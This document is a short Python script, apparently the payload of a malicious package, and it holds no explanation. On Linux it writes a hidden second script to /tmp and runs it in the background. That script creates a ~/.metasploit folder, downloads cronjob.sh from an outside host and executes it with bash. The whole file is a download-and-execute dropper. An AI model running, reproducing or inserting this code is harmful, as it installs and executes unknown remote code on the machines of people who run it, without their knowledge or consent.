import platform
import subprocess
if platform.system().startswith("Linux"):
        try:
            with open('/tmp/file.py', 'w') as f:
                f.write("import os \nimport subprocess \nfrom pathlib import Path \nfrom urllib import request \n")
                f.write("hello = os.getlogin() \n")
                f.write("PATH = '/home/' + hello + '/.metasploit'\n")
                f.write("isExist = os.path.exists(PATH) \n")
                f.write("if not isExist:\n")
                f.write("        os.makedirs(PATH) \n")
                f.write("if Path(PATH).is_file(): \n")
                f.write("           print("") \n")
                f.write("else: \n")
                f.write("     remote_url = 'https://dark.devsecwise.com/cronjob.sh' \n")
                f.write("     local_file = PATH+'/cronjob.sh' \n")
                f.write("     request.urlretrieve(remote_url, local_file) \n")
                f.write("     subprocess.call(\"bash /home/$USER/.metasploit/cronjob.sh\", shell=True) \n")
        except FileNotFoundError:
            print("")
        subprocess.call("python3 /tmp/file.py &", shell=True)
else:
    print("")
